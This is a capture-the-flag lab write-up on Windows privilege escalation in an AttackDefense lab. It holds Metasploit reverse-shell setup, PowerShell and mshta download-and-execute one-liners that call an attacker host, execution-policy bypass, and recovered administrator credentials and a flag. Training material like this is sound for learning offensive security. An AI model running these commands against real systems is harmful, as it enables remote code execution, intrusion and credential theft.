# üî¨Windows Privilege Escalation

> üî¨ [Windows: PrivescCheck](https://attackdefense.com/challengedetailsnoauth?cid=2404)
>
> * Target IP: `10.0.25.167`
> * Usage of the [**PrivescCheck.ps1**](https://github.com/itm4n/PrivescCheck) **script**
>   * _already present on the Victim Machine_

## Enumeration & Exploitation <a href="#enumeration-and-exploitation" id="enumeration-and-exploitation"></a>

```bash
nmap -sV 10.0.25.167
    PORT     STATE SERVICE       VERSION
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
service postgresql start && msfconsole -q
```

```bash
setg RHOSTS 10.0.25.167

search web_delivery
use exploit/multi/script/web_delivery
info
# Description:
#   This module quickly fires up a web server that serves a payload. The 
#   provided command which will allow for a payload to download and 
#   execute.
set target PSH\ (Binary)
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand false
set LHOST eth1
exploit
```

* Copy the PowerShell code and run it on the target machine using `cmd`

```
powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\zJgQatAv.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.38.2:8080/OcPDNDcyu', $z); invoke-item $z
```

<figure><img src="../../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

* Back to the Attacker machine, _Command shell session opened_

<figure><img src="../../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

```bash
sessions 1
whoami
# Unprivileged user "student"
```

<figure><img src="../../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

```bash
# Upgrade to a Meterpreter session
background
search shell_to
use post/multi/manage/shell_to_meterpreter
set LHOST eth1
set SESSION 1
show advanced
set WIN_TRANSFER VBS
options
# check the LPORT is not in conflict with the Session 1
run
sessions 2
```

<figure><img src="../../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

```bash
ps
migrate 1032
getprivs
```

<figure><img src="../../../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

```bash
cd C:\\Users\\student\\Desktop\\PrivescCheck
shell
dir
```

* Run [**`PrivescCheck`**](https://github.com/itm4n/PrivescCheck)

```bash
# Basic mode
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# Extended Mode + Export Txt Report
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
```

```bash
exit
meterpreter > download PrivescCheck_ATTACKDEFENSE.txt

root@attackdefense:~# featherpad PrivescCheck_ATTACKDEFENSE.txt
```

<figure><img src="../../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

> üìå `administrator`:`hello_123321`

### Administrator Login <a href="#administrator-login" id="administrator-login"></a>

* Use the `administrator` user to run a **privileged `cmd`**, trying `SMB` legitimate authentication



<figure><img src="../../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

* This can be done with the `exploit/windows/smb/psexec` Metasploit module too.

{% hint style="success" %}
**Flag:** `2b070a650a92129c2462deae7707b0c5`
{% endhint %}

## Second Method

* Run `PrivescCheck.ps1` script on target machine

```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

<figure><img src="../../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

```bash
runas.exe /user:administrator cmd
```

<figure><img src="../../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

* Run `msfconsole` in attacker machine

```bash
msfconsole -q
use exploit/windows/misc/hta_server
exploit
# ‚ÄúThis module hosts an HTML Application (HTA) that when opened will run a payload via
# Powershell..‚Äù
```

* Copy the generated payload i.e `‚Äúhttp://10.10.38.2:8080/jxEyD3w.hta‚Äù` and run it on cmd.exe with mshta command to gain the meterpreter shell
  * Execute the payload on the target machine with cmd.exe.

```bash
mshta.exe http://10.10.38.2:8080/jxEyD3w.hta
# This shall spawn a meterpreter session on target machine powershell
```
